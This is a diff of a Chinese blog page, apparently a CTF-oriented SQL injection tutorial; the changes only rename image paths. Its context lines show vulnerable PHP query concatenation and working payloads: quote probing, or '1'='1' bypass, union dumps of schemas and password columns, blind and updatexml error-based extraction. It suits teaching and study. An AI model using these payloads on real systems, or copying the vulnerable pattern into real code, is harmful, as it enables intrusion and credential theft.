@@ -26,28 +26,28 @@
 <meta property="og:site_name" content="(｡･ω･｡)Welcome~">
 <meta property="og:description" content="以前一直搞不太懂 SQL 注入的一些东西，不知道为什么要加单引号或双引号，为什么有时候用 and 但有时候又用 or，最近看了一些 SQL 注入知识点，所以总结一些 qwq">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QLschema.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL1.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL2.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL3.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL4.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL5.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL6.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL7.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL8.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL9.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL10.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL11.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL12.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL13.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL14.png">
-<meta property="og:image" content="http://example.com/2024/11/06/TestWP/QL15.png">
+<meta property="og:image" content="http://example.com/SQLschema.png">
+<meta property="og:image" content="http://example.com/SQL1.png">
+<meta property="og:image" content="http://example.com/SQL2.png">
+<meta property="og:image" content="http://example.com/SQL3.png">
+<meta property="og:image" content="http://example.com/SQL4.png">
+<meta property="og:image" content="http://example.com/SQL5.png">
+<meta property="og:image" content="http://example.com/SQL6.png">
+<meta property="og:image" content="http://example.com/SQL7.png">
+<meta property="og:image" content="http://example.com/SQL8.png">
+<meta property="og:image" content="http://example.com/SQL9.png">
+<meta property="og:image" content="http://example.com/SQL10.png">
+<meta property="og:image" content="http://example.com/SQL11.png">
+<meta property="og:image" content="http://example.com/SQL12.png">
+<meta property="og:image" content="http://example.com/SQL13.png">
+<meta property="og:image" content="http://example.com/SQL14.png">
+<meta property="og:image" content="http://example.com/SQL15.png">
 <meta property="article:published_time" content="2024-11-09T16:07:00.000Z">
 <meta property="article:modified_time" content="2024-11-10T17:30:01.010Z">
 <meta property="article:author" content="butt3rf1y">
 <meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/11/06/TestWP/QLschema.png">
+<meta name="twitter:image" content="http://example.com/SQLschema.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -371,7 +371,7 @@
 <p>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，可以通过修改 Cookie 中的值来进行 SQL 注入</p>
 <p>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，可以在 HTTP 头部中进行 SQL 注入</p>
 <p>数据库查询语句：如果有源码，直接进行代码审计，可能有直接拼接 SQL 查询语句的地方，存在 SQL 注入</p>
-<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2024/11/06/TestWP/QLschema.png"></p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/SQLschema.png"></p>
 <p>如上图，数据库的结构为</p>
 <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+数据库 <span class="hljs-function"><span class="hljs-params">(database)</span>	--&gt;</span>ctf_database<br>+ - 表_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>	--&gt;</span>user<br>+ - 表_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>	--&gt;</span>users<br>+ + - 列_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>	--&gt;</span>id<br>+ + - 列_username <span class="hljs-function"><span class="hljs-params">(column_username)</span>	--&gt;</span>username<br>+ + - 列_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>	--&gt;</span>password<br>+ + + - 数据<br>+ + + - 数据<br></code></pre></td></tr></table></figure>
 
@@ -420,15 +420,15 @@
 <h3 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h3><p><code>1&quot;</code></p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">执行：id = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>报错：near <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//去掉外层 SQL 的单引号，留下 <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,可以判断出是双引号的字符型注入</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL1.png"></p>
+<p><img src="/SQL1.png"></p>
 <p><code>1&#39;</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// 去掉外层留下 &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,再除去注入的 1<span class="hljs-string">&#x27;,可以判断出是单引号的字符型注入</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL2.png"></p>
+<p><img src="/SQL2.png"></p>
 <p><code>&#39;1</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// 对于 SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>已经闭合，所以 1<span class="hljs-string">&#x27; 成为了报错点</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL3.png"></p>
+<p><img src="/SQL3.png"></p>
 <h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure>
 
 <p>根据用户输入 id，查询用户信息。用户的输入 id 字段，没有任何过滤地被直接拼接在了 sql 查询语句中。由于 id 没有被引用包裹，而且类型为数字，此为数字型注入。</p>
@@ -437,21 +437,21 @@
 <p>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL4.png"></p>
+<p><img src="/SQL4.png"></p>
 <p>以把 1 换成其他的，比如 <code>database()</code></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL5.png"></p>
+<p><img src="/SQL5.png"></p>
 <p><strong>空格的 url 编码是 %20</strong>，如果要查询其他行，还需要使用 **limit **关键字。</p>
 <p>使用联合查询去得到数据库的表名，先获取当前库（<code>database()</code>）</p>
 <p>基于 <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code> 查询</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL6.png"></p>
+<p><img src="/SQL6.png"></p>
 <p>获取 表 的对应字段名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL7.png"></p>
+<p><img src="/SQL7.png"></p>
 <h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure>
 
 <p>通过 username 查询 id，而且用户输入的 username 被单引号包裹起来了。所有用户的所有输入都会被当成字符串处理，无法将之前的数字型注入的 payload 进行注入了。如果输入中有一个引号，就可以将前面的引号闭合，使得后面的内容从字符串中逃逸出来。最后将后面的引号注释掉。</p>
@@ -465,23 +465,23 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure>
 
 <p>这样就直接可以使 <code>where</code> 条件为<strong>永真</strong>，直接输出 <code>select * from user</code> 的所有内容</p>
-<p><img src="/2024/11/06/TestWP/QL8.png"></p>
+<p><img src="/SQL8.png"></p>
 <p><code>order by</code> 判断函数</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//报错</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL9.png"></p>
+<p><img src="/SQL9.png"></p>
 <p>库名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL10.png"></p>
+<p><img src="/SQL10.png"></p>
 <p>表名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL11.png"></p>
+<p><img src="/SQL11.png"></p>
 <p>字段名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL12.png"></p>
+<p><img src="/SQL12.png"></p>
 <h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>顾名思义就是服务器不显示查询结果，只返回是否查询成功时，无法使用 union 直接回显数据，需要盲注。盲注有时间盲注和布尔盲注。</p>
 <p>例句</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure>
@@ -493,7 +493,7 @@
 <p>执行语句：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL13.png"></p>
+<p><img src="/SQL13.png"></p>
 <p>这里要求两个条件为真，一是有 <code>id=1</code>，二是 <code>1=1</code>。</p>
 <p>如果 输入<code>1=2</code>，并不会有回显，返回为空，因为 <code>and</code> 后面的条件并不满足。</p>
 <p>所以可以利用此特点来获取其他信息：</p>
@@ -528,7 +528,7 @@
 
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL14.png"></p>
+<p><img src="/SQL14.png"></p>
 <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用语句执行时间判断真假</p>
 <h3 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF() 函数"></a><code>IF()</code> 函数</h3><p>判断指定条件是否成立，根据结果返回不同的值</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:条件成立时要返回的值<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:条件不成立时要返回的值<br></code></pre></td></tr></table></figure>
@@ -570,7 +570,7 @@
 <p><strong><code>limit()</code> 函数</strong></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//可以不断改变 <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> 的值逐行获取<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/11/06/TestWP/QL15.png"></p>
+<p><img src="/SQL15.png"></p>
 <p><strong><code>substr()</code>函数</strong></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure>
 
